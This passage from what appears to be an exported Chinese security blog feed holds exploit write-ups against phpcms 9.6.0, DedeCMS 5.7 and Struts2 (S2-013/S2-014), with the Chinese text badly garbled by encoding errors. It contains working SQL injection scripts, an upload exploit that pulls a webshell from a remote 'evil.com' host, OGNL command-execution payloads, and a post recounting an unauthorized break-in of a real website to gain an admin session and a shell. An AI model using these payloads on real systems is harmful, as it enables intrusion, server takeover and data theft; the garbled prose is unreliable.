intval(trim($_GET[&#39;siteid&#39;])) : (param::get_cookie(&#39;siteid&#39;) ? param::get_cookie(&#39;siteid&#39;) : 1);        param::set_cookie(&#39;siteid&#39;,$this-&gt;siteid);            $this-&gt;wap_site = getcache(&#39;wap_site&#39;,&#39;wap&#39;);        $this-&gt;types = getcache(&#39;wap_type&#39;,&#39;wap&#39;);        $this-&gt;wap = $this-&gt;wap_site[$this-&gt;siteid];        define(&#39;WAP_SITEURL&#39;, $this-&gt;wap[&#39;domain&#39;] ? $this-&gt;wap[&#39;domain&#39;].&#39;index.php?&#39; : APP_PATH.&#39;index.php?m=wap&amp;siteid=&#39;.$this-&gt;siteid);        if($this-&gt;wap[&#39;status&#39;]!=1) exit(L(&#39;wap_close_status&#39;));    }</code></pre><p>äºæ˜¯æ•´ä¸ªæ”»å‡»é“¾ä¾¿å®Œæ•´äº†</p><p>å…ˆåˆ©ç”¨wapæ¥è·å¾—<code>userid</code></p><p><code>http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=wap&amp;siteid=1</code></p><p><code>2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou</code></p><p>å†åˆ©ç”¨attachmentæ¥è·å¾—åŠ å¯†çš„æ¶æ„sqlè¯­å¥</p><pre><code>http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;src=(çœ‹pocå§)post:userid_flash=2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou</code></pre><h2 id="æ£€æµ‹è„šæœ¬"><a href="#æ£€æµ‹è„šæœ¬" class="headerlink" title="æ£€æµ‹è„šæœ¬"></a>æ£€æµ‹è„šæœ¬</h2><pre><code class="python">import reimport requestsimport randomdef poc(url,proxies={}):    sess=requests.session()    sess.get(&quot;%s/index.php?m=wap&amp;siteid=1&quot;%url)    sess.proxies=proxies    pre=list(sess.cookies.get_dict())[0][:5]+&quot;_&quot;    userid=sess.cookies.get_dict()[pre+&quot;siteid&quot;]    param={        &quot;m&quot;:&quot;attachment&quot;,        &quot;c&quot;:&quot;attachments&quot;,        &quot;a&quot;:&quot;swfupload_json&quot;,        &quot;src&quot;:&quot;=1&amp;id=nobodyasdfsdsf%2;7-(updatexml(1,concat(0x7e,(select%2;0user()),0x7e),1))%23&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=1&amp;ss&quot;    }    sess.post(&quot;%s/index.php&quot;%url,params=param,data={&quot;userid_flash&quot;:userid})    a_k=sess.cookies.get_dict()[pre+&quot;att_json&quot;]    result=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=%s&quot;%(url,a_k)).text    #print(userid,a_k)    if &quot;XPATH syntax error&quot; in result:        return True    return False#,{&quot;http&quot;:&quot;socks5://127.0.0.1:1080&quot;}print(poc(&quot;http://127.0.0.1/cms/phpcms/9.6.0/&quot;))</code></pre><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://mochazz.github.io/2019/07/18/phpcmsæ¼æ´åˆ†æåˆé›†" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcmsæ¼æ´åˆ†æåˆé›†</a></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2020/02/13/phpcmsv9.6.0SQLæ³¨å…¥/">https://explorersss.github.io/2020/02/13/phpcmsv9.6.0SQLæ³¨å…¥/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpcms960ä»»æ„æ–‡ä»¶ä¸Šä¼ å¤ç°</title>
      <link href="/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="phpcmsv9-6-0ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#phpcmsv9-6-0ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="phpcmsv9.6.0ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a>phpcmsv9.6.0ä»»æ„æ–‡ä»¶ä¸Šä¼ </h1><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p>phpcms v9.6.0</p><p>å¼€å¯ç”¨æˆ·æ³¨å†ŒåŠŸèƒ½</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æ ¹æ®ç½‘ç»œä¸Šæä¾›çš„pocè¿›è¡Œæ¼æ´å¤ç°:</p><pre><code class="python">import reimport requestsdef poc(url):    u = &#39;{}/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&#39;.format(url)    data = {        &#39;siteid&#39;: &#39;1&#39;,        &#39;modelid&#39;: &#39;1&#39;,        &#39;username&#39;: &#39;test&#39;,        &#39;password&#39;: &#39;testxx&#39;,        &#39;email&#39;: &#39;test@test.com&#39;,        &#39;info[content]&#39;: &#39;&lt;img src=http://url/shell.txt?.php#.jpg&gt;&#39;,        &#39;dosubmit&#39;: &#39;1&#39;,    }    rep = requests.post(u, data=data)    shell = &#39;&#39;    re_result = re.findall(r&#39;&amp;lt;img src=(.*)&amp;gt&#39;, rep.content)    if len(re_result):        shell = re_result[0]        print shell</code></pre><p>æ¼æ´çš„å…³é”®ä½ç½®</p><p><code>phpcms/modules/member/index.php</code>:135</p><pre><code class="php">if($member_setting[&#39;choosemodel&#39;]) {    require_once CACHE_MODEL_PATH.&#39;member_input.class.php&#39;;    require_once CACHE_MODEL_PATH.&#39;member_update.class.php&#39;;    $member_input = new member_input($userinfo[&#39;modelid&#39;]);            $_POST[&#39;info&#39;] = array_map(&#39;new_html_special_chars&#39;,$_POST[&#39;info&#39;]);    $user_model_info = $member_input-&gt;get($_POST[&#39;info&#39;]);                                        }</code></pre><p><code>$_POST[&#39;info&#39;]</code>è¢«<code>new_html_special_chars</code>å¤„ç†å,ç›´æ¥ä½œä¸ºå‚æ•°ä¼ å…¥<code>$member_input-&gt;get</code></p><p>è·Ÿè¿›å»å‘ç°</p><pre><code class="php">if(is_array($data)) {            foreach($data as $field=&gt;$value) {                ...                $field = safe_replace($field);                ...                $func = $this-&gt;fields[$field][&#39;formtype&#39;];                if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value);                $info[$field] = $value;            }        }</code></pre><p><code>$this-&gt;$func($field, $value);</code>ä»¤äººæµ®æƒ³è”ç¿©çš„å‘½ä»¤,è€Œ<code>$func = $this-&gt;fields[$field][&#39;formtype&#39;];</code>,å…¶ä¸­<code>$field</code>æ˜¯æˆ‘ä»¬å¯æ§çš„è¾“å…¥<code>new_html_special_chars($_POST[&#39;info&#39;]) as $field=&gt;$value</code></p><p>è€Œ<code>$this-&gt;fields[$field][&#39;formtype&#39;];</code>æœ‰ä»¥ä¸‹å–å€¼,æˆ‘ä»¬å¯ä»¥æ§åˆ¶å…¶æ‰§è¡ŒæŸä¸€å‡½æ•°</p><pre><code class="php">$this-&gt;fields[&#39;catid&#39;][&#39;formtype&#39;]=&quot;catid&quot;$this-&gt;fields[&#39;typeid&#39;][&#39;formtype&#39;]=&quot;typeid&quot;$this-&gt;fields[&#39;title&#39;][&#39;formtype&#39;]=&quot;title&quot;$this-&gt;fields[&#39;keywords&#39;][&#39;formtype&#39;]=&quot;keyword&quot;$this-&gt;fields[&#39;copyfrom&#39;][&#39;formtype&#39;]=&quot;copyfrom&quot;$this-&gt;fields[&#39;description&#39;][&#39;formtype&#39;]=&quot;textarea&quot;$this-&gt;fields[&#39;updatetime&#39;][&#39;formtype&#39;]=&quot;datetime&quot;$this-&gt;fields[&#39;content&#39;][&#39;formtype&#39;]=&quot;editor&quot;$this-&gt;fields[&#39;thumb&#39;][&#39;formtype&#39;]=&quot;image&quot;$this-&gt;fields[&#39;relation&#39;][&#39;formtype&#39;]=&quot;omnipotent&quot;$this-&gt;fields[&#39;pages&#39;][&#39;formtype&#39;]=&quot;pages&quot;$this-&gt;fields[&#39;inputtime&#39;][&#39;formtype&#39;]=&quot;datetime&quot;$this-&gt;fields[&#39;posids&#39;][&#39;formtype&#39;]=&quot;posid&quot;$this-&gt;fields[&#39;groupids_view&#39;][&#39;formtype&#39;]=&quot;groupid&quot;$this-&gt;fields[&#39;voteid&#39;][&#39;formtype&#39;]=&quot;omnipotent&quot;$this-&gt;fields[&#39;islink&#39;][&#39;formtype&#39;]=&quot;islink&quot;$this-&gt;fields[&#39;url&#39;][&#39;formtype&#39;]=&quot;text&quot;$this-&gt;fields[&#39;listorder&#39;][&#39;formtype&#39;]=&quot;number&quot;$this-&gt;fields[&#39;template&#39;][&#39;formtype&#39;]=&quot;template&quot;$this-&gt;fields[&#39;allow_comment&#39;][&#39;formtype&#39;]=&quot;box&quot;$this-&gt;fields[&#39;status&#39;][&#39;formtype&#39;]=&quot;box&quot;$this-&gt;fields[&#39;readpoint&#39;][&#39;formtype&#39;]=&quot;readpoint&quot;$this-&gt;fields[&#39;username&#39;][&#39;formtype&#39;]=&quot;text&quot;</code></pre><p>ä¸€ä¸ªä¸€ä¸ªæŸ¥çœ‹æœ€åå‘ç°:</p><pre><code class="php">    function editor($field, $value) {        $setting = string2array($this-&gt;fields[$field][&#39;setting&#39;]);        $enablesaveimage = $setting[&#39;enablesaveimage&#39;];        $site_setting = string2array($this-&gt;site_config[&#39;setting&#39;]);        $watermark_enable = intval($site_setting[&#39;watermark_enable&#39;]);        $value = $this-&gt;attachment-&gt;download(&#39;content&#39;, $value,$watermark_enable);        return $value;    }</code></pre><p><code>editor</code>ä¼šè°ƒç”¨downloadæ–¹æ³•,å…¶ä¸­<code>$field</code>å’Œ<code>$value</code>éƒ½æ˜¯å¯æ§çš„</p><p>è·Ÿè¿›<code>download</code>:</p><pre><code class="php">function download($field, $value,$watermark = &#39;0&#39;,$ext = &#39;gif|jpg|jpeg|bmp|png&#39;, $absurl = &#39;&#39;, $basehref = &#39;&#39;)    {        global $image_d;        $this-&gt;att_db = pc_base::load_model(&#39;attachment_model&#39;);        $upload_url = pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;);        $this-&gt;field = $field;        $dir = date(&#39;Y/md/&#39;);        $uploadpath = $upload_url.$dir;        $uploaddir = $this-&gt;upload_root.$dir;        $string = new_stripslashes($value);        if(!preg_match_all(&quot;/(href|src)=([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;        $remotefileurls = array();        foreach($matches[3] as $matche)        {            if(strpos($matche, &#39;://&#39;) === false) continue;            dir_create($uploaddir);            $remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref);        }        unset($matches, $string);        $remotefileurls = array_unique($remotefileurls);        $oldpath = $newpath = array();        foreach($remotefileurls as $k=&gt;$file) {            if(strpos($file, &#39;://&#39;) === false || strpos($file, $upload_url) !== false) continue;            $filename = fileext($file);            $file_name = basename($file);            $filename = $this-&gt;getname($filename);            $newfile = $uploaddir.$filename;            $upload_func = $this-&gt;upload_func;            if($upload_func($file, $newfile)) {                $oldpath[] = $k;                $GLOBALS[&#39;downloadfiles&#39;][] = $newpath[] = $uploadpath.$filename;                @chmod($newfile, 0777);                $fileext = fileext($filename);                if($watermark){                    watermark($newfile, $newfile,$this-&gt;siteid);                }                $filepath = $dir.$filename;                $downloadedfile = array(&#39;filename&#39;=&gt;$filename, &#39;filepath&#39;=&gt;$filepath, &#39;filesize&#39;=&gt;filesize($newfile), &#39;fileext&#39;=&gt;$fileext);                $aid = $this-&gt;add($downloadedfile);                $this-&gt;downloadedfiles[$aid] = $filepath;            }        }        return str_replace($oldpath, $newpath, $value);    }    </code></pre><p><code>download</code>ç”¨<code>$upload_func($file, $newfile)</code>æ¥ä¸‹è½½æ–‡ä»¶åˆ°æœåŠ¡å™¨,è€Œ<code>$upload_func=&quot;copy&quot;</code></p><p>æˆ‘ä»¬åˆ†æä¸€ä¸‹<code>download</code>å‡½æ•°,<code>$file</code>å’Œ<code>$newfile</code>ç»è¿‡çš„å¤„ç†</p><p><code>$file</code>æ˜¯<code>$remotefileurls</code>ä¸­çš„å€¼</p><pre><code class="php">        $string = new_stripslashes($value);//åè½¬ä¹‰        if(!preg_match_all(&quot;/(href|src)=([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;        $remotefileurls = array();        foreach($matches[3] as $matche)        {            if(strpos($matche, &#39;://&#39;) === false) continue;            dir_create($uploaddir);            $remotefileurls[$matche] = $this-&gt;fillurl($matche, &#39;&#39;, &#39;&#39;);        }</code></pre><p>è·Ÿè¿›<code>$this-&gt;fillurl</code>,å¤§æ¦‚åŠŸèƒ½æ˜¯,å»æ‰url<code>#</code>åé¢çš„ä¸œè¥¿</p><pre><code class="php">function fillurl($surl, $absurl, $basehref = &#39;&#39;) {        ...        $pos = strpos($surl,&#39;#&#39;);        if($pos&gt;0) $surl = substr($surl,0,$pos);        ...    }</code></pre><p>æ„é€ <code>$value=&#39;src=http://evil.com/evil.php#.jpg&#39;</code></p><p>æˆ‘ä»¬å†çœ‹ä¸‹<code>$newfile</code></p><pre><code class="php">$dir = date(&#39;Y/md/&#39;);$uploaddir = $this-&gt;upload_root.$dir;$filename = fileext($file);$filename = $this-&gt;getname($filename);$newfile = $uploaddir.$filename;</code></pre><p><code>$this-&gt;getname</code>:</p><pre><code class="php">function getname($fileext){        return date(&#39;Ymdhis&#39;).rand(100, 999).&#39;.&#39;.$fileext;    }</code></pre><p>webshellçš„åœ°å€ä¸º:<code>http://website/uploadfile/date(&#39;Y/md/&#39;)/date(&#39;Ymdhis&#39;).rand(100, 999).php</code></p><p>æœ€åpayloadä¸º:</p><pre><code>/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1post:info[content]=&lt;img src=&quot;http://evil.com/evil.php&quot;&gt;</code></pre><h2 id="åˆ©ç”¨è„šæœ¬"><a href="#åˆ©ç”¨è„šæœ¬" class="headerlink" title="åˆ©ç”¨è„šæœ¬"></a>åˆ©ç”¨è„šæœ¬</h2><pre><code class="python">import reimport requestsimport randomdef exp(url,evilurl=&quot;http://xxxxxxx/evil.php&quot;):    u = &#39;{}/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&#39;.format(url)    data = {        &#39;siteid&#39;: &#39;1&#39;,        &#39;modelid&#39;: &#39;1&#39;,        &#39;username&#39;: &#39;test%d&#39;%random.randint(1,999999),        &#39;password&#39;: &#39;testxx&#39;,        &#39;email&#39;: &#39;test%d@test.com&#39;%random.randint(1,999999),        &#39;info[content]&#39;: &#39;src=%s#.jpg&#39;%evilurl,        &#39;dosubmit&#39;: &#39;1&#39;,    }    rep = requests.post(u, data=data)    result=re.search(r&quot;VALUES \(&#39;src=(.*)&#39;,&#39;\d*&#39;\)&quot;,rep.text).groups()    print(rep.text)    print(result)exp(&quot;http://127.0.0.1/cms/phpcms/9.6.0&quot;)</code></pre><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2020/02/12/phpcms960ä»»æ„æ–‡ä»¶ä¸Šä¼ å¤ç°/">https://explorersss.github.io/2020/02/12/phpcms960ä»»æ„æ–‡ä»¶ä¸Šä¼ å¤ç°/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡æ¼æ´æŒ–æ˜</title>
      <link href="/2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
      <url>/2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
      
        <content type="html"><![CDATA[<h1 id="æ— æ ‡é¢˜"><a href="#æ— æ ‡é¢˜" class="headerlink" title="æ— æ ‡é¢˜"></a>æ— æ ‡é¢˜</h1><p>æŸä¸ªæœˆé»‘é£é«˜çš„æ™šä¸Š,æˆ‘çªç„¶æƒ³èµ·äº†æˆ‘çš„å¤å¤æ¸¸æˆæœºè¿˜å·®ä¸€ç‚¹åº“å¸,äºæ˜¯å†³å®šå»æŒ–ä¸ªæ´ â€¦â€¦.</p><p>ç»è¿‡ä¸€ç•ªæƒ¨ç»äººå¯°,æ¬²ç½¢ä¸èƒ½çš„ä¿¡æ¯æ”¶é›†å,æˆ‘å¼€å§‹äº†fuzz,ç„¶å ipè¢«ban:(</p><p>ä¸»è¦çš„ä¿¡æ¯ä¸º:</p><pre><code>dedecms 5.7sp1 20150618ZOHO ManageEngine OpManageradminer 4.6.3</code></pre><p>çˆ†ç ´å¯†ç ,fuzzæ–‡ä»¶å•¥çš„éƒ½å¹²è¿‡,dedecmsçš„åå°ä¹Ÿæ²¡çˆ†å‡ºæ¥,ä½†æ˜¯å‘ç°ä»–ä»¬æœåŠ¡å™¨é…ç½®é”™è¯¯,å¯ä»¥æµè§ˆç›®å½•</p><p>æŠŠè¯¥ç‰ˆæœ¬çš„dedecmsä¹‹åçš„æ›´æ–°å¯¹æ¯”äº†ä»¥ä¸‹,æ²¡å‘ç°æœ‰å•¥æ´,æ­¤æ—¶å°±é™·å…¥äº†åƒµå±€</p><p>ä½†æ˜¯,æˆ‘éšæ‰‹ç‚¹äº†ä¸€ä¸ª<code>en</code>çš„è¶…é“¾æ¥,å°±å‘ç°äº†ä¸€ä¸ªæ–°çš„åŸŸå!!!!</p><p>ç„¶åè¿™ä¸ªåŸŸåä¸‹çš„æœåŠ¡,ä¹Ÿæ˜¯dedecms,è€Œåå°å°±æ˜¯<code>/dede</code></p><p>åˆ©ç”¨å‰é¢å‘ç°çš„ç›®å½•æµè§ˆ,æˆ‘æˆåŠŸæ‹¿åˆ°äº†<code>admin</code>çš„session,ç›´æ¥è¿›å…¥åå°getshell</p><p><strong>ä¸€äº›ç½‘ç«™çš„è‹±æ–‡ç«™ç‚¹å¯èƒ½å°±æ˜¯æˆ‘ä»¬çš„çªç ´å£</strong></p><p>èµ„äº§æ”¶é›†çœŸçš„å¤ªé‡è¦äº†,è¦ä¸æ˜¯è¿™æ¬¡è¿æ°”å¥½,æˆ‘è¿˜ä¸çŸ¥é“å•¥æ—¶å€™èƒ½æ—¥æ‰</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2020/02/11/è®°ä¸€æ¬¡æ¼æ´æŒ–æ˜/">https://explorersss.github.io/2020/02/11/è®°ä¸€æ¬¡æ¼æ´æŒ–æ˜/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´æŒ–æ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DedeCMS 5.7 plusguestbook.phpæ³¨å…¥æ¼æ´</title>
      <link href="/2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="DedeCMS-5-7-plus-guestbook-php-æ³¨å…¥æ¼æ´"><a href="#DedeCMS-5-7-plus-guestbook-php-æ³¨å…¥æ¼æ´" class="headerlink" title="DedeCMS 5.7 plus/guestbook.php æ³¨å…¥æ¼æ´"></a>DedeCMS 5.7 plus/guestbook.php æ³¨å…¥æ¼æ´</h1><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p>æ¼æ´æˆåŠŸéœ€è¦æ¡ä»¶ï¼š</p><ol><li>php magic_quotes_gpc=off</li><li>æ¼æ´æ–‡ä»¶å­˜åœ¨ plus/guestbook.php dede_guestbook è¡¨å½“ç„¶ä¹Ÿè¦å­˜åœ¨ã€‚</li></ol><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>poc:<code>www.xxx.com/plus/guestbook.php?action=admin&amp;job=editok&amp;msg=sebug&#39;&amp;id=å­˜åœ¨çš„ç•™è¨€ID</code></p><p><code>/plus/guestbook.php</code>ä¸­ä¸ºå¯¹èº«ä»½è¿›è¡ŒéªŒè¯:</p><pre><code class="php">if($action==&#39;admin&#39;){    include_once(dirname(__FILE__).&#39;/guestbook/edit.inc.php&#39;);    exit();}</code></pre><p><code>/plus/guestbook/edit.inc.php</code></p><pre><code class="php">if($job==&#39;editok&#39;){    $remsg = trim($remsg);    if($remsg!=&#39;&#39;)    {        //ç®¡ç†å‘˜å›å¤ä¸è¿‡æ»¤HTML        if($g_isadmin)        {            $msg = &quot;&lt;div class=\\&#39;rebox\\&#39;&gt;&quot;.$msg.&quot;&lt;/div&gt;\n&quot;.$remsg;             //$remsg &lt;br&gt;&lt;font color=red&gt;ç®¡ç†å‘˜å›å¤ï¼š&lt;/font&gt;        }        else        {            $row = $dsql-&gt;GetOne(&quot;SELECT msg From `#@__guestbook` WHERE id=&#39;$id&#39; &quot;);            $oldmsg = &quot;&lt;div class=\\&#39;rebox\\&#39;&gt;&quot;.addslashes($row[&#39;msg&#39;]).&quot;&lt;/div&gt;\n&quot;;            $remsg = trimMsg(cn_substrR($remsg, 1024), 1);            $msg = $oldmsg.$remsg;        }    }     $msg = HtmlReplace($msg, -1);    $dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__guestbook` SET `msg`=&#39;$msg&#39;, `posttime`=&#39;&quot;.time().&quot;&#39; WHERE id=&#39;$id&#39; &quot;);    ShowMsg(&quot;æˆåŠŸæ›´æ”¹æˆ–å›å¤ä¸€æ¡ç•™è¨€ï¼&quot;, $GUEST_BOOK_POS);    exit();}</code></pre><p>å…¶ä¸­:</p><pre><code class="php">$msg = HtmlReplace($msg, -1);    $dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__guestbook` SET `msg`=&#39;$msg&#39;, `posttime`=&#39;&quot;.time().&quot;&#39; WHERE id=&#39;$id&#39; &quot;);</code></pre><p>dedecmsä¸­çš„<code>common.inc.php</code>,æœ‰è¿™æ ·çš„ä¸€æ®µä»£ç </p><pre><code class="php">foreach(Array(&#39;_GET&#39;,&#39;_POST&#39;,&#39;_COOKIE&#39;) as $_request)    {        foreach($$_request as $_k =&gt; $_v)         {            if($_k == &#39;nvarname&#39;) ${$_k} = $_v;            else ${$_k} = _RunMagicQuotes($_v);        }    }</code></pre><p>å®ƒå°†<code>_GET</code>,<code>_POST</code>,<code>_COOKIE</code>ä¸­çš„å˜é‡æ”¾å‡ºæ¥,è€Œ<code>_RunMagicQuotes</code></p><pre><code class="php">function _RunMagicQuotes(&amp;$svar){    if(!get_magic_quotes_gpc())    {        ...    }    return $svar;}</code></pre><p>æ‰€ä»¥<code>magic_quotes_gpc=off</code>çš„æƒ…å†µä¸‹ä¾¿ä¼šå¼•èµ·sqlæ³¨å…¥</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://www.seebug.org/vuldb/ssvid-89599" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-89599</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š [<a href="https://explorersss.github.io/2020/02/10/DedeCMS">https://explorersss.github.io/2020/02/10/DedeCMS</a> 5.7 plusguestbook.phpæ³¨å…¥æ¼æ´/](<a href="https://explorersss.github.io/2020/02/10/DedeCMS">https://explorersss.github.io/2020/02/10/DedeCMS</a> 5.7 plusguestbook.phpæ³¨å…¥æ¼æ´/) <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>S2-013_S2-014è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</title>
      <link href="/2020/02/08/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/02/08/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="S2-013-S2-014-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#S2-013-S2-014-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="S2-013/S2-014 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>S2-013/S2-014 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h1><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p>structs2  ç‰ˆæœ¬: 2.0.0 - 2.3.14.1 </p><h2 id="åˆ©ç”¨è„šæœ¬"><a href="#åˆ©ç”¨è„šæœ¬" class="headerlink" title="åˆ©ç”¨è„šæœ¬"></a>åˆ©ç”¨è„šæœ¬</h2><p>s2-013</p><pre><code>link.action?xxx=${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}// æˆ–link.action?xxx=${#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())}</code></pre><p>s2-014</p><pre><code>http://localhost:8080/S2-013/link.action?xxxx=${(#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false)(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true)(@java.lang.Runtime@getRuntime().exec(&quot;ls&quot;))}</code></pre><h2 id="æ£€æµ‹è„šæœ¬"><a href="#æ£€æµ‹è„šæœ¬" class="headerlink" title="æ£€æµ‹è„šæœ¬"></a>æ£€æµ‹è„šæœ¬</h2><p>S2-013</p><pre><code class="python">import requestsdef poc(url):    url+=&#39;&#39;&#39;/link.action&#39;&#39;&#39;    data={        &#39;xxx&#39;:&#39;&#39;&#39;${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#39;echo structs2_s2-013_vuln_checkflag&#39;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}&#39;&#39;&#39;    }    try :        res=requests.get(url,params=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;})        if &quot;structs2_s2-013_vuln_checkflag&quot; in res.text and res.status_code==200:            return True    except :        pass    return False</code></pre><p>S2-014</p><pre><code class="python">import requestsdef poc(url):    url+=&#39;&#39;&#39;/link.action&#39;&#39;&#39;    data={        